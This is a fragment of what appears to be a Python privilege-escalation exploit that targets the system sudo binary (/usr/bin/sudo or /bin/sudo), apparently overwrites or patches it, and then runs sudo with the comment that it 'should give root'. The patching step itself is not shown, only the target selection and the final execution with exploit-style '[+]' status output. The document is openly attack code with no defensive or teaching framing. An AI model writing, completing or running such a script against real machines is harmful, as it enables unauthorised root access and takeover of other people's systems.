...
# Target the sudo binary
TARGET_BINARY = "/usr/bin/sudo"  # Primary target (most systems)
FALLBACK_TARGET = "/bin/sudo"  # Fallback for some distributions

def set_target():
    """Determine which sudo binary exists and should be targeted"""
    if os.path.exists(TARGET_BINARY):
        return TARGET_BINARY
    elif os.path.exists(FALLBACK_TARGET):
        return FALLBACK_TARGET
    else:
        raise FileNotFoundError(f"Could not find sudo binary. Tried: {TARGET_BINARY}, {FALLBACK_TARGET}")
...
print("[+] Executing modified sudo...")
print()

# Execute patched sudo - should give root
os.system(f"sudo")
